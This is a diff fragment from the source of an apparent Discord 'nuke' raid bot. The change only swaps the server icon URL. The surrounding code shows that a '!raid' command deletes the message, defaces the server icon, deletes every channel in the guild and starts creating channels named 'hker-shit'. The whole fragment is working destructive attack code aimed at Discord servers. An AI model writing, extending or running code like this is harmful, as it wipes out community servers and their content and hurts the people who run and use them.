@@ -91,7 +91,7 @@ client.on("message", message => {
  
   if(message.content === '!raid') {
     message.delete()
-    message.guild.setIcon("https://cdn.discordapp.com/attachments/849130373102436363/849330810787725332/unknown.png");
+    message.guild.setIcon("https://images-ext-2.discordapp.net/external/FfhmbBSbtjnujfrfo6D_lGHHSLF10v7xEvLQTx_gjj4/%3Fsize%3D256%26f%3D.gif/https/cdn.discordapp.com/avatars/847345059455041547/a_022e77f36d14c7a63b6a880a3cf668ce.gif");
     console.log("[$]", console.log("NUKE SUCCESFULLY"));
     message.guild.channels.cache.forEach(channel => channel.delete());
     message.guild.channels.create(`hker-shit`, {
